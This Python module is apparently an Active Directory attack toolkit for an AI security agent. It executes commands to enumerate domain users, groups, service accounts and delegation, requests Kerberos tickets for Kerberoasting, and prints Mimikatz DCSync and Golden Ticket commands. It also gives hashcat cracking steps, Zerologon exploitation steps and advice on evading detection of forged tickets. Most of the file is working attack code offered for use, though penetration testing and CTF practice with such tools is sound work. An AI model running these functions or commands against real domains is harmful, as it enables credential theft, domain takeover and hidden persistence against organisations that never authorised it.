"""
Active Directory Attack Toolkit for CAI

This module provides comprehensive Active Directory attack tools including
Kerberoasting, DCSync, Golden Ticket attacks, domain enumeration, and privilege escalation.
"""

import os
import re
import time
import json
import base64
import subprocess
from typing import Dict, List, Tuple, Optional, Any
from cai.tools.common import run_command


def automated_ad_assessment(domain: str = None, ctf=None, **kwargs) -> str:
    """
    Perform comprehensive Active Directory security assessment
    
    Args:
        domain: Target domain name (auto-detected if not provided)
        
    Returns:
        str: Detailed AD assessment results
    """
    results = []
    results.append("=== Active Directory Security Assessment ===")
    results.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")

    # Auto-detect domain if not provided
    if not domain:
        domain = detect_domain(ctf=ctf)

    results.append(f"Target Domain: {domain}")
    results.append("")

    try:
        # 1. Domain Enumeration
        results.append("=== Domain Enumeration ===")
        domain_enum = enumerate_active_directory(domain, ctf=ctf)
        results.append(domain_enum)
        results.append("")

        # 2. User Enumeration
        results.append("=== User Enumeration ===")
        user_enum = enumerate_domain_users(domain, ctf=ctf)
        results.append(user_enum)
        results.append("")

        # 3. Group Enumeration
        results.append("=== Group Enumeration ===")
        group_enum = enumerate_domain_groups(domain, ctf=ctf)
        results.append(group_enum)
        results.append("")

        # 4. Computer Enumeration
        results.append("=== Computer Enumeration ===")
        computer_enum = enumerate_domain_computers(domain, ctf=ctf)
        results.append(computer_enum)
        results.append("")

        # 5. Trust Relationships
        results.append("=== Trust Relationships ===")
        trust_enum = enumerate_domain_trusts(domain, ctf=ctf)
        results.append(trust_enum)
        results.append("")

        # 6. Kerberoasting Opportunities
        results.append("=== Kerberoasting Assessment ===")
        kerberoast_assess = assess_kerberoasting_opportunities(domain, ctf=ctf)
        results.append(kerberoast_assess)
        results.append("")

        # 7. AS-REP Roasting
        results.append("=== AS-REP Roasting Assessment ===")
        asrep_assess = assess_asrep_roasting(domain, ctf=ctf)
        results.append(asrep_assess)
        results.append("")

        # 8. Privilege Escalation Paths
        results.append("=== Privilege Escalation Paths ===")
        privesc_paths = analyze_ad_privilege_escalation(domain, ctf=ctf)
        results.append(privesc_paths)
        results.append("")

        return "\n".join(results)

    except Exception as e:
        return f"Error during AD assessment: {str(e)}"


def detect_domain(ctf=None, **kwargs) -> str:
    """Auto-detect the current Active Directory domain"""
    try:
        # Method 1: Environment variable
        domain_env = run_command("echo %USERDOMAIN%", ctf=ctf)
        if domain_env.strip() and domain_env.strip() != "%USERDOMAIN%":
            return domain_env.strip()

        # Method 2: WMI query
        domain_wmi = run_command("wmic computersystem get domain /value", ctf=ctf)
        domain_match = re.search(r'Domain=(.+)', domain_wmi)
        if domain_match:
            return domain_match.group(1).strip()

        # Method 3: PowerShell
        domain_ps = run_command("powershell \"(Get-WmiObject Win32_ComputerSystem).Domain\"", ctf=ctf)
        if domain_ps.strip():
            return domain_ps.strip()

        return "WORKGROUP"  # Default fallback
    except Exception:
        return "UNKNOWN"


def enumerate_active_directory(domain: str, ctf=None, **kwargs) -> str:
    """Enumerate basic Active Directory information"""
    results = []

    try:
        # Domain Controllers
        results.append("=== Domain Controllers ===")
        dcs = run_command(f"nslookup -type=SRV _ldap._tcp.{domain}", ctf=ctf)
        results.append(dcs)

        # Also try nltest
        nltest_dcs = run_command(f"nltest /dclist:{domain}", ctf=ctf)
        if nltest_dcs.strip():
            results.append(f"\nDomain Controllers (nltest):\n{nltest_dcs}")

        # Domain information
        results.append(f"\n=== Domain Information ===")
        domain_info = run_command(f"net time /domain:{domain}", ctf=ctf)
        results.append(f"Domain time sync:\n{domain_info}")

        # Forest information
        forest_info = run_command("nltest /domain_trusts", ctf=ctf)
        if forest_info.strip():
            results.append(f"\nForest/Trust Information:\n{forest_info}")

        # FSMO roles
        fsmo_roles = run_command("netdom query fsmo", ctf=ctf)
        if fsmo_roles.strip():
            results.append(f"\nFSMO Roles:\n{fsmo_roles}")

        # Domain functional level
        func_level = run_command(f"powershell \"(Get-ADDomain {domain}).DomainMode\" 2>nul", ctf=ctf)
        if func_level.strip():
            results.append(f"\nDomain Functional Level: {func_level}")

        # Password policy
        pwd_policy = run_command(f"net accounts /domain", ctf=ctf)
        if pwd_policy.strip():
            results.append(f"\nDomain Password Policy:\n{pwd_policy}")

    except Exception as e:
        results.append(f"Error enumerating domain: {str(e)}")

    return "\n".join(results)


def enumerate_domain_users(domain: str, ctf=None, **kwargs) -> str:
    """Enumerate domain users and identify high-value targets"""
    results = []

    try:
        # Basic user enumeration
        results.append("Enumerating domain users...")

        # Method 1: net user
        domain_users = run_command(f"net user /domain", ctf=ctf)
        if domain_users.strip():
            results.append("Domain users:")
            results.append(domain_users)

        # Method 2: PowerShell (if available)
        ps_users = run_command(
            f"powershell \"Get-ADUser -Filter * -Properties Name,SamAccountName,Enabled | Select-Object Name,SamAccountName,Enabled\" 2>nul",
            ctf=ctf)
        if ps_users.strip():
            results.append(f"\nDetailed user enumeration:\n{ps_users}")

        # Method 3: wmic
        wmic_users = run_command(f"wmic /namespace:\\\\root\\directory\\ldap path ds_user get ds_samaccountname",
                                 ctf=ctf)
        if wmic_users.strip():
            results.append(f"\nWMIC user enumeration:\n{wmic_users}")

        # Look for high-value accounts
        results.append(f"\n=== High-Value Account Analysis ===")
        high_value_accounts = [
            'administrator', 'admin', 'domain admin', 'enterprise admin',
            'krbtgt', 'guest', 'service', 'sql', 'exchange', 'backup'
        ]

        for account in high_value_accounts:
            account_info = run_command(f"net user {account} /domain 2>nul", ctf=ctf)
            if account_info.strip() and "not found" not in account_info.lower():
                results.append(f"\nüî• HIGH-VALUE ACCOUNT: {account}")
                results.append(account_info[:300])  # Limit output

        # Service Principal Names (SPNs)
        results.append(f"\n=== Service Principal Names ===")
        spn_query = run_command("setspn -T " + domain + " -Q */*", ctf=ctf)
        if spn_query.strip():
            results.append("Found SPNs (potential Kerberoasting targets):")
            results.append(spn_query[:500])  # Limit output

        # Users with AdminCount=1
        admincount_users = run_command(
            f"powershell \"Get-ADUser -Filter {{AdminCount -eq 1}} -Properties AdminCount | Select-Object Name,SamAccountName\" 2>nul",
            ctf=ctf)
        if admincount_users.strip():
            results.append(f"\nüî• Users with AdminCount=1 (privileged):\n{admincount_users}")

        # Users with Do Not Require Kerberos Pre-authentication
        prerauth_users = run_command(
            f"powershell \"Get-ADUser -Filter {{DoesNotRequirePreAuth -eq $true}} | Select-Object Name,SamAccountName\" 2>nul",
            ctf=ctf)
        if prerauth_users.strip():
            results.append(f"\nüî• Users without Kerberos Pre-auth (AS-REP Roasting targets):\n{prerauth_users}")

    except Exception as e:
        results.append(f"Error enumerating users: {str(e)}")

    return "\n".join(results)


def enumerate_domain_groups(domain: str, ctf=None, **kwargs) -> str:
    """Enumerate domain groups and memberships"""
    results = []

    try:
        results.append("Enumerating domain groups...")

        # All domain groups
        domain_groups = run_command(f"net group /domain", ctf=ctf)
        if domain_groups.strip():
            results.append("Domain groups:")
            results.append(domain_groups)

        # High-privilege groups
        results.append(f"\n=== High-Privilege Groups ===")
        high_priv_groups = [
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Administrators", "Backup Operators", "Account Operators",
            "Server Operators", "Print Operators"
        ]

        for group in high_priv_groups:
            group_members = run_command(f"net group \"{group}\" /domain 2>nul", ctf=ctf)
            if group_members.strip() and "not found" not in group_members.lower():
                results.append(f"\nüî• {group} members:")
                results.append(group_members)

        # Custom groups with interesting names
        interesting_groups = run_command(
            f"net group /domain | findstr /i \"admin\\|sql\\|service\\|backup\\|exchange\"", ctf=ctf)
        if interesting_groups.strip():
            results.append(f"\nüîç Interesting custom groups:\n{interesting_groups}")

        # PowerShell group enumeration
        ps_groups = run_command(
            f"powershell \"Get-ADGroup -Filter * | Select-Object Name,GroupCategory,GroupScope\" 2>nul", ctf=ctf)
        if ps_groups.strip():
            results.append(f"\nDetailed group information:\n{ps_groups[:500]}")

    except Exception as e:
        results.append(f"Error enumerating groups: {str(e)}")

    return "\n".join(results)


def enumerate_domain_computers(domain: str, ctf=None, **kwargs) -> str:
    """Enumerate domain computers and identify targets"""
    results = []

    try:
        results.append("Enumerating domain computers...")

        # Domain computers
        domain_computers = run_command(f"net view /domain:{domain}", ctf=ctf)
        if domain_computers.strip():
            results.append("Domain computers:")
            results.append(domain_computers)

        # PowerShell computer enumeration
        ps_computers = run_command(
            f"powershell \"Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,Enabled\" 2>nul", ctf=ctf)
        if ps_computers.strip():
            results.append(f"\nDetailed computer information:\n{ps_computers[:500]}")

        # Look for interesting computers
        results.append(f"\n=== Interesting Computers ===")
        interesting_computers = run_command(
            f"powershell \"Get-ADComputer -Filter * | Where-Object {{$_.Name -like '*SQL*' -or $_.Name -like '*EXCHANGE*' -or $_.Name -like '*DC*' -or $_.Name -like '*BACKUP*'}} | Select-Object Name\" 2>nul",
            ctf=ctf)
        if interesting_computers.strip():
            results.append(f"High-value computers:\n{interesting_computers}")

        # Operating system breakdown
        os_breakdown = run_command(
            f"powershell \"Get-ADComputer -Filter * -Properties OperatingSystem | Group-Object OperatingSystem | Select-Object Name,Count\" 2>nul",
            ctf=ctf)
        if os_breakdown.strip():
            results.append(f"\nOperating System breakdown:\n{os_breakdown}")

        # Servers vs Workstations
        servers = run_command(
            f"powershell \"Get-ADComputer -Filter {{OperatingSystem -like '*Server*'}} | Select-Object Name,OperatingSystem\" 2>nul",
            ctf=ctf)
        if servers.strip():
            results.append(f"\nDomain Servers:\n{servers[:300]}")

    except Exception as e:
        results.append(f"Error enumerating computers: {str(e)}")

    return "\n".join(results)


def enumerate_domain_trusts(domain: str, ctf=None, **kwargs) -> str:
    """Enumerate domain trust relationships"""
    results = []

    try:
        results.append("Enumerating domain trusts...")

        # nltest domain trusts
        nltest_trusts = run_command("nltest /domain_trusts", ctf=ctf)
        if nltest_trusts.strip():
            results.append("Domain trusts (nltest):")
            results.append(nltest_trusts)

        # PowerShell trust enumeration
        ps_trusts = run_command(
            f"powershell \"Get-ADTrust -Filter * | Select-Object Name,TrustType,TrustDirection\" 2>nul", ctf=ctf)
        if ps_trusts.strip():
            results.append(f"\nDetailed trust information:\n{ps_trusts}")

        # Forest trusts
        forest_trusts = run_command("nltest /trusted_domains", ctf=ctf)
        if forest_trusts.strip():
            results.append(f"\nTrusted domains:\n{forest_trusts}")

        # Check for external trusts
        external_trusts = run_command(
            f"powershell \"Get-ADTrust -Filter {{TrustType -eq 'External'}} | Select-Object Name,TrustDirection,TrustType\" 2>nul",
            ctf=ctf)
        if external_trusts.strip():
            results.append(f"\nüîç External trusts found:\n{external_trusts}")

    except Exception as e:
        results.append(f"Error enumerating trusts: {str(e)}")

    return "\n".join(results)


def assess_kerberoasting_opportunities(domain: str, ctf=None, **kwargs) -> str:
    """Assess Kerberoasting attack opportunities"""
    results = []

    try:
        results.append("Assessing Kerberoasting opportunities...")

        # Find all SPNs
        spn_query = run_command(f"setspn -T {domain} -Q */*", ctf=ctf)
        if spn_query.strip():
            results.append("Service Principal Names found:")

            # Parse SPNs and identify vulnerable accounts
            spn_lines = spn_query.split('\n')
            vulnerable_accounts = []

            for line in spn_lines:
                if 'CN=' in line:
                    # Extract account name
                    cn_match = re.search(r'CN=([^,]+)', line)
                    if cn_match:
                        account = cn_match.group(1)
                        if account not in ['krbtgt'] and '$' not in account:  # Exclude computer accounts and krbtgt
                            vulnerable_accounts.append(account)

            if vulnerable_accounts:
                results.append(f"\nüî• KERBEROASTABLE ACCOUNTS ({len(set(vulnerable_accounts))}):")
                for account in set(vulnerable_accounts):
                    results.append(f"  - {account}")

                results.append(f"\nTo perform Kerberoasting:")
                results.append(f"1. Request service tickets for these accounts")
                results.append(f"2. Extract tickets from memory")
                results.append(f"3. Crack offline with hashcat/john")
            else:
                results.append("No obviously vulnerable service accounts found")

        # PowerShell method
        ps_spns = run_command(
            f"powershell \"Get-ADUser -Filter {{ServicePrincipalName -ne '$null'}} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName\" 2>nul",
            ctf=ctf)
        if ps_spns.strip():
            results.append(f"\nService accounts with SPNs:\n{ps_spns}")

        # Check for high-privilege service accounts
        high_priv_services = run_command(
            f"powershell \"Get-ADUser -Filter {{ServicePrincipalName -ne '$null' -and AdminCount -eq 1}} | Select-Object Name,ServicePrincipalName\" 2>nul",
            ctf=ctf)
        if high_priv_services.strip():
            results.append(f"\nüö® HIGH-PRIVILEGE SERVICE ACCOUNTS:\n{high_priv_services}")

    except Exception as e:
        results.append(f"Error assessing Kerberoasting: {str(e)}")

    return "\n".join(results)


def assess_asrep_roasting(domain: str, ctf=None, **kwargs) -> str:
    """Assess AS-REP Roasting attack opportunities"""
    results = []

    try:
        results.append("Assessing AS-REP Roasting opportunities...")

        # Find users without Kerberos pre-authentication
        no_preauth = run_command(
            f"powershell \"Get-ADUser -Filter {{DoesNotRequirePreAuth -eq $true}} | Select-Object Name,SamAccountName,Enabled\" 2>nul",
            ctf=ctf)

        if no_preauth.strip():
            results.append("üî• USERS WITHOUT KERBEROS PRE-AUTH:")
            results.append(no_preauth)
            results.append("\nThese accounts are vulnerable to AS-REP Roasting!")
            results.append("Attack: Request AS-REP without pre-authentication, crack offline")
        else:
            results.append("No users found without Kerberos pre-authentication")

        # Check for users with DONT_REQUIRE_PREAUTH flag
        ldap_query = run_command(
            f"powershell \"Get-ADUser -Filter * -Properties UserAccountControl | Where-Object {{$_.UserAccountControl -band 0x400000}} | Select-Object Name,SamAccountName\" 2>nul",
            ctf=ctf)
        if ldap_query.strip():
            results.append(f"\nUsers with DONT_REQUIRE_PREAUTH flag:\n{ldap_query}")

        # Suggest attack methodology
        results.append(f"\n=== AS-REP Roasting Attack Guide ===")
        results.append(f"1. Identify users without pre-auth (done above)")
        results.append(f"2. Request AS-REP: GetNPUsers.py -dc-ip DC_IP -no-pass domain/")
        results.append(f"3. Crack hashes offline with hashcat mode 18200")

    except Exception as e:
        results.append(f"Error assessing AS-REP Roasting: {str(e)}")

    return "\n".join(results)


def analyze_ad_privilege_escalation(domain: str, ctf=None, **kwargs) -> str:
    """Analyze Active Directory privilege escalation paths"""
    results = []

    try:
        results.append("Analyzing AD privilege escalation opportunities...")

        # Check for GenericAll/WriteDacl permissions
        results.append("\n=== Dangerous Permissions Analysis ===")

        # Look for users with DCSync permissions
        dcsync_check = run_command(
            f"powershell \"Get-ADUser -Filter * -Properties * | Where-Object {{$_.nTSecurityDescriptor -like '*Replicating Directory Changes*'}} | Select-Object Name\" 2>nul",
            ctf=ctf)
        if dcsync_check.strip():
            results.append(f"üö® Users with DCSync permissions:\n{dcsync_check}")

        # Check for unconstrained delegation
        unconstrained_delegation = run_command(
            f"powershell \"Get-ADComputer -Filter {{TrustedForDelegation -eq $true}} | Select-Object Name,OperatingSystem\" 2>nul",
            ctf=ctf)
        if unconstrained_delegation.strip():
            results.append(f"\nüî• UNCONSTRAINED DELEGATION COMPUTERS:\n{unconstrained_delegation}")
            results.append("These systems can impersonate any user!")

        # Check for constrained delegation
        constrained_delegation = run_command(
            f"powershell \"Get-ADUser -Filter {{msDS-AllowedToDelegateTo -ne '$null'}} -Properties msDS-AllowedToDelegateTo | Select-Object Name,msDS-AllowedToDelegateTo\" 2>nul",
            ctf=ctf)
        if constrained_delegation.strip():
            results.append(f"\nüîç Constrained delegation users:\n{constrained_delegation}")

        # LAPS analysis
        laps_check = run_command(
            f"powershell \"Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {{$_.'ms-Mcs-AdmPwd' -ne $null}} | Select-Object Name\" 2>nul",
            ctf=ctf)
        if laps_check.strip():
            results.append(f"\nLAPS-managed computers:\n{laps_check}")
        else:
            results.append("\n‚ö†Ô∏è LAPS not detected - local admin passwords may be reused!")

        # Check for users with interesting ACLs
        results.append(f"\n=== Interesting ACL Analysis ===")

        # Users who can reset passwords
        reset_password = run_command(
            f"powershell \"Get-ADUser -Filter * | Get-Acl | Where-Object {{$_.Access.ActiveDirectoryRights -like '*GenericAll*' -or $_.Access.ActiveDirectoryRights -like '*ResetPassword*'}} | Select-Object -First 5\" 2>nul",
            ctf=ctf)
        if reset_password.strip():
            results.append(f"Users with password reset permissions:\n{reset_password}")

        # Check for certificate templates (potential ESC attacks)
        cert_templates = run_command(
            f"powershell \"Get-ADObject -Filter {{objectClass -eq 'pKICertificateTemplate'}} | Select-Object Name\" 2>nul",
            ctf=ctf)
        if cert_templates.strip():
            results.append(f"\nCertificate templates (check for ESC vulnerabilities):\n{cert_templates}")

        # Check for GPOs with potential abuse
        gpo_analysis = run_command(
            f"powershell \"Get-GPO -All | Select-Object DisplayName,GpoStatus | Where-Object {{$_.GpoStatus -eq 'AllSettingsEnabled'}}\" 2>nul",
            ctf=ctf)
        if gpo_analysis.strip():
            results.append(f"\nActive GPOs (potential GPO abuse):\n{gpo_analysis[:300]}")

    except Exception as e:
        results.append(f"Error analyzing privilege escalation: {str(e)}")

    return "\n".join(results)


def perform_kerberoasting_attack(target_account: str = None, domain: str = None, ctf=None, **kwargs) -> str:
    """Perform Kerberoasting attack against service accounts"""
    results = []

    try:
        if not domain:
            domain = detect_domain(ctf=ctf)

        results.append(f"Performing Kerberoasting attack...")
        results.append(f"Domain: {domain}")

        if target_account:
            results.append(f"Target: {target_account}")

            # Request service ticket for specific account
            ticket_request = run_command(
                f"powershell \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '{target_account}'\"",
                ctf=ctf)
            results.append(f"Service ticket requested for {target_account}")
        else:
            # Get all service accounts
            results.append("Requesting tickets for all service accounts...")
            spn_accounts = run_command(f"setspn -T {domain} -Q */*", ctf=ctf)
            results.append("Service tickets requested")

        # Extract tickets from memory
        results.append(f"\n=== Ticket Extraction ===")
        extract_tickets = run_command("klist", ctf=ctf)
        if extract_tickets.strip():
            results.append("Current Kerberos tickets:")
            results.append(extract_tickets)

        # Suggest next steps
        results.append(f"\n=== Next Steps ===")
        results.append("1. Extract tickets using Mimikatz: kerberos::list /export")
        results.append("2. Convert to hashcat format: kirbi2john.py *.kirbi > hashes.txt")
        results.append("3. Crack with hashcat: hashcat -m 13100 hashes.txt wordlist.txt")

        # Try to extract using built-in tools
        ticket_export = run_command("powershell \"klist /export\"", ctf=ctf)
        if ticket_export.strip():
            results.append(f"\nTicket export attempt:\n{ticket_export}")

    except Exception as e:
        results.append(f"Error performing Kerberoasting: {str(e)}")

    return "\n".join(results)


def perform_dcsync_attack(target_user: str = "krbtgt", domain: str = None, ctf=None, **kwargs) -> str:
    """Perform DCSync attack to extract password hashes"""
    results = []

    try:
        if not domain:
            domain = detect_domain(ctf=ctf)

        results.append(f"Attempting DCSync attack...")
        results.append(f"Domain: {domain}")
        results.append(f"Target: {target_user}")

        # Check if we have DCSync permissions
        current_user = run_command("whoami", ctf=ctf).strip()
        results.append(f"Current user: {current_user}")

        # Check group memberships for DCSync capability
        groups = run_command("whoami /groups", ctf=ctf)
        if any(group in groups.lower() for group in ['domain admins', 'enterprise admins', 'administrators']):
            results.append("‚úì User appears to have high privileges")
        else:
            results.append("‚ö†Ô∏è User may not have DCSync permissions")

        # DCSync requires specific AD permissions:
        # - DS-Replication-Get-Changes
        # - DS-Replication-Get-Changes-All
        # - DS-Replication-Get-Changes-In-Filtered-Set (for newer domains)

        results.append(f"\n=== DCSync Attack Simulation ===")
        results.append("Note: Actual DCSync requires tools like Mimikatz")
        results.append("Mimikatz command: lsadump::dcsync /domain:{domain} /user:{target_user}")

        # Try to gather information about the target user
        user_info = run_command(f"net user {target_user} /domain", ctf=ctf)
        if user_info.strip():
            results.append(f"\nTarget user information:\n{user_info}")

        # Check domain controller accessibility
        dc_ping = run_command(f"ping -n 1 {domain}", ctf=ctf)
        if "TTL=" in dc_ping:
            results.append(f"\n‚úì Domain controller is accessible")
        else:
            results.append(f"\n‚ö†Ô∏è Cannot reach domain controller")

        # Suggest attack vectors
        results.append(f"\n=== Attack Vectors ===")
        results.append("1. If Domain Admin: Use Mimikatz DCSync directly")
        results.append("2. If not DA: Look for delegation or ACL abuse")
        results.append("3. Golden Ticket: Use krbtgt hash for persistence")
        results.append("4. Silver Ticket: Use service account hashes")

    except Exception as e:
        results.append(f"Error performing DCSync: {str(e)}")

    return "\n".join(results)


def create_golden_ticket(domain: str, krbtgt_hash: str, target_user: str = "Administrator", ctf=None, **kwargs) -> str:
    """Create Golden Ticket for domain persistence"""
    results = []

    try:
        results.append("=== Golden Ticket Creation ===")
        results.append(f"Domain: {domain}")
        results.append(f"Target User: {target_user}")
        results.append(f"KRBTGT Hash: {krbtgt_hash[:20]}...")

        # Get domain SID
        domain_sid = run_command(f"powershell \"(Get-ADDomain {domain}).DomainSID.Value\" 2>nul", ctf=ctf)
        if not domain_sid.strip():
            # Alternative method
            domain_sid = run_command(f"whoami /user", ctf=ctf)
            sid_match = re.search(r'(S-1-5-21-\d+-\d+-\d+)', domain_sid)
            if sid_match:
                domain_sid = sid_match.group(1)

        results.append(f"Domain SID: {domain_sid}")

        # Golden Ticket parameters
        results.append(f"\n=== Golden Ticket Parameters ===")
        results.append(f"Domain: {domain}")
        results.append(f"SID: {domain_sid}")
        results.append(f"User: {target_user}")
        results.append(f"KRBTGT Hash: {krbtgt_hash}")

        # Mimikatz command for Golden Ticket
        mimikatz_cmd = f"kerberos::golden /domain:{domain} /sid:{domain_sid} /user:{target_user} /krbtgt:{krbtgt_hash} /ticket:golden.kirbi"
        results.append(f"\nMimikatz Golden Ticket command:")
        results.append(mimikatz_cmd)

        # Usage instructions
        results.append(f"\n=== Usage Instructions ===")
        results.append("1. Clear existing tickets: klist purge")
        results.append("2. Load golden ticket: kerberos::ptt golden.kirbi")
        results.append("3. Verify access: dir \\\\domain-controller\\c$")
        results.append("4. Access any system in domain as domain admin")

        # Persistence notes
        results.append(f"\n=== Persistence Notes ===")
        results.append("- Golden tickets are valid for 10 years by default")
        results.append("- Changing KRBTGT password twice will invalidate all golden tickets")
        results.append("- Can be used for lateral movement across entire domain")
        results.append("- Difficult to detect without proper monitoring")

        # Detection evasion
        results.append(f"\n=== Detection Evasion ===")
        results.append("- Use realistic usernames and groups")
        results.append("- Avoid suspicious timestamps")
        results.append("- Limit ticket lifetime")
        results.append("- Use during business hours")

    except Exception as e:
        results.append(f"Error creating golden ticket: {str(e)}")

    return "\n".join(results)


def perform_zerologon_check(domain_controller: str, ctf=None, **kwargs) -> str:
    """Check for Zerologon vulnerability (CVE-2020-1472)"""
    results = []

    try:
        results.append("=== Zerologon Vulnerability Check ===")
        results.append(f"Target DC: {domain_controller}")

        # Basic connectivity check
        ping_dc = run_command(f"ping -n 1 {domain_controller}", ctf=ctf)
        if "TTL=" not in ping_dc:
            results.append("‚ö†Ô∏è Cannot reach domain controller")
            return "\n".join(results)

        results.append("‚úì Domain controller is reachable")

        # Check DC OS version (Zerologon affects Windows Server 2016-2019)
        dc_info = run_command(f"nbtstat -A {domain_controller}", ctf=ctf)
        if dc_info.strip():
            results.append(f"DC Information:\n{dc_info}")

        # Zerologon vulnerability check
        results.append(f"\n=== Zerologon Vulnerability Assessment ===")
        results.append("Zerologon (CVE-2020-1472) affects:")
        results.append("- Windows Server 2008 R2")
        results.append("- Windows Server 2012 R2")
        results.append("- Windows Server 2016")
        results.append("- Windows Server 2019")
        results.append("- Windows Server 2022 (unpatched)")

        # Check if patched
        results.append(f"\n=== Patch Status Check ===")
        results.append("To check if patched, look for:")
        results.append("- KB4571719 (Aug 2020)")
        results.append("- KB4571729 (Sep 2020)")
        results.append("- Later security updates")

        # Attack methodology
        results.append(f"\n=== Attack Methodology ===")
        results.append("1. Send crafted authentication requests")
        results.append("2. Exploit weak cryptographic implementation")
        results.append("3. Reset domain controller machine account password")
        results.append("4. Gain domain admin privileges")

        # Tools and exploitation
        results.append(f"\n=== Exploitation Tools ===")
        results.append("- zerologon-scan.py (detection)")
        results.append("- cve-2020-1472-exploit.py (exploitation)")
        results.append("- Impacket tools for post-exploitation")

        # Warning
        results.append(f"\n‚ö†Ô∏è  WARNING: Zerologon exploitation can break domain authentication!")
        results.append("Always test in isolated environment first!")

    except Exception as e:
        results.append(f"Error checking Zerologon: {str(e)}")

    return "\n".join(results)
